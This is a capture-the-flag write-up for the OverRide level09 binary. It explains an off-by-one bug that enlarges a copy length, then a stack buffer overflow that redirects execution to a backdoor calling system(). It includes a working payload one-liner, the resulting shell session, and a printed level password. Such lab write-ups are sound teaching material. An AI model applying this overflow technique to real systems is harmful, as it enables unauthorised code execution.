# level09

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

<hr>

## Solution

From the [disassembled binary](./source.s) and the [source](./source.c) code we can see that program is vulnerable to `buffer overflow` attack.

First, I found this function while disassembled code, and the goal of the level became obvious. We need to call this function.
```c
void secret_backdoor(void) {
    char tmp[128];

    fgets(tmp, 128, stdin);
    system(tmp);
}
```

Let's find out it's address:
```bash
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

To call this function we need first to analyze the [source code](./source.c):
```c
struct s_data {
    int len;
    char username[40];
    char msg[140];
};
...
void handle_msg() {
    struct s_data data;

    memset(data.username, 0, 40);

    data.len = 140;
    set_username(&data);
    set_msg(&data);
    puts(">: Msg sent!");
}
```

First, thing we see, that `data` contains two buffers that possibly can be overflowed. <br>
The size of this struct is 140 + 40 + 4 = 184 bytes. <br>

From the disassembled code, we can see that in the `handle_msg` 192 bytes allocated on stack. <br>
And the address of beginning of the `data` is `RSP` or `RBP - 192`. <br>
To overwrite return address of this function, we need to overwrite 192 bytes reserved for local variables, <br>
8 bytes for saved `EBP` and the next 8 bytes will be the address of saved `EIP` we need to change.
```asm
handle_msg:
    push   %rbp
    mov    %rsp,%rbp
    sub    $0xc0,%rsp   ; 192 bytes allocated on stack`
   
    lea    -0xc0(%rbp),%rax
    ...
```

Now let's put our attention at `set_msg` function, as it reads a way too more chars than the size of buffer we want to overflow:
```c
void set_msg(struct s_data *data) {
    char tmp[1024];

    memset(tmp, 0, 1024);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");

    fgets(tmp, 1024, stdin);

    strncpy(data->msg, tmp, data->len);
}
```
Well, the only thing that stops us from copying using `strncpy` is `data->len` set to 140 in the `handle_msg`. <br>

A little mistake in the source code helps us to avoid this restriction:
```c
void set_username(struct s_data *data) {
    int i;
    char tmp[140];

    memset(tmp, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");

    fgets(tmp, 128, stdin);

    for (i = 0; i <= 40 && tmp[i]; i++) {
        data->username[i] = tmp[i];
    }
    printf(">: Welcome, %s", data->username);
}
```

Not see ? `for` loop copying `41` bytes instead of 40, and this last byte is the lowest 8 bits of `data->len`. <br>
This helps us to increase data->len up to 0xff or `255`. <br>

We don't need that much, `208` bytes (`0xd0`) will be perfect. <br>
Again, 140 bytes of `msg` + 40 bytes of `username` + 4 bytes of `len` + 8 unused bytes + 8 bytes for saved `EBP` + 8 bytes for new return address.

We should also remember about `\n` if we don't want first `fgets` to read more than we want to.

Let's finish this great project as well as the branch:
```bash
level09@OverRide:~$ (python -c 'print "mhufflep" * 5 + "\xd0\x0a" + "mhufflep" * 25 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, mhufflepmhufflepmhufflepmhufflepmhufflep�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
cd ../end
ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 13  2016 .
dr-x--x--x  1 root root   260 Oct  2  2016 ..
-rw-r--r--  1 end  end    220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root root     7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 end  end   3489 Sep 10  2016 .bashrc
-rwsr-s---+ 1 end  users    5 Sep 10  2016 end
-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
-rw-r--r--  1 end  end    675 Sep 10  2016 .profile
cat .pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## References
